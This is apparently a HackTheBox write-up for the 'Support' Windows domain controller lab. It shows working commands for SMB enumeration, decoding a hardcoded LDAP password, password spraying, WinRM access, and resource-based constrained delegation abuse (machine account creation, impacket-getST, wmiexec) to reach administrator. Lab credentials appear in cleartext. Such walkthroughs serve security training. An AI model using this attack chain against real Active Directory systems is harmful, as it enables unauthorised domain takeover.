 ---
 title: HTB | Support
 author: Zeropio
 date: 2022-08-28
 categories: [Pentesting, HackTheBox]
 tags: [htb, windows, easy, machines]
 permalink: /pentesting/htb/machines/support
 image:
  path: /assets/img/hackthebox/card/Support.png
  width: 800
  height: 500
---

# Footprinting

The nmap provides us with:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-28 15:40:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
58047/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-28T15:40:59
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

## RPC

We can star a `rpcclient` on the DC:

```console
zero@pio$ rpcclient -U "" -N 10.10.11.174
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

We can access but doesn’t have rights to get anything. We can run `enum4linux` to get some info, but only got that:

- Some usernames: administrator, guest, krbtgt, domain admins, root, bin, none
- Server 10.10.11.174 allows sessions using username '', password '’
- Domain Name: SUPPORT
- Host is part of a domain (not a workgroup)

## SMB

We can list the SMB contents:

```console
zero@pio$ smbclient -N -L \\\\10.10.11.174

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

We cannot connect to **NETLOGON**:

```console
zero@pio$ smbclient -N \\\\10.10.11.174\\NETLOGON
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

But we can connect to **support-tools**:

```console
zero@pio$ smbclient -N \\\\10.10.11.174\\support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
```

We can see some zips files. Let’s see what are in them.

# Foothold

We can use **dnSpy** to see the code of the **UserInfo.exe** we got in the smb. We see a **Protected** file that contains a key and the way to decode the password. We can use Python to get the password:

```console
zero@pio$ python3
>>> enc_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> import base64
>>> array = base64.b64decode(enc_password)
>>> array2 = []
>>> for i in range(len(array)):
...     array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
... 
>>> print("".join(array2))
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Now we can use `ldapsearch` with the password:

```console
zero@pio$ ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'
```

We get a bunch of information. We can get a password in a info field as `info: Ironside47pleasure40Watchful` . We can do a password spray with the users we got in this output. First, filter by them:

```console
zero@pio$ ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U'
```

Add them to a list and use crackmapexec:

```console
zero@pio$ crackmapexec smb 10.10.11.174 -u valid_users -p "Ironside47pleasure40Watchful"

SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

We can connect now:

```console
zero@pio$ evil-winrm -i 10.10.11.174 -u support -p "Ironside47pleasure40Watchful"
```

# Privilege Escalation

We can check the privileges of our user:

```console
*Evil-WinRM* PS C:\Users\support\Desktop> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Desktop> Get-ObjectAcl -SamAccountName support -ResolveGUIDs
```

We can see that we have **GenericAll** privileges. Let’s use it to create a new user:

```console
*Evil-WinRM* PS C:\Users\support\Desktop> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Desktop> $password = ConvertTo-SecureString 'SecurePass1' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\support\Desktop> New-MachineAccount -MachineAccount hacker -Password $password -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = hacker$
Verbose: [+] Distinguished Name = CN=hacker,CN=Computers,DC=support,DC=htb
[+] Machine account hacker added
```

Now we need to get the SID:

```console
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer hacker

pwdlastset             : 8/28/2022 9:49:09 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=hacker,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : hacker
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5103
samaccountname         : hacker$
```

Now, with the SID, let’s add the privileges to the account to request TGT tickets:

```console
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Use the user from the Linux host to request a ticket:

```console
zero@pio$ impacket-getST support.htb/hacker:SecurePass1 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
```

Export the ticket and use `wmiexec` to get the shell:

```console
zero@pio$ export KRB5CCNAME=administrator.ccache
zero@pio$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k

C:\>whoami
support\administrator
```
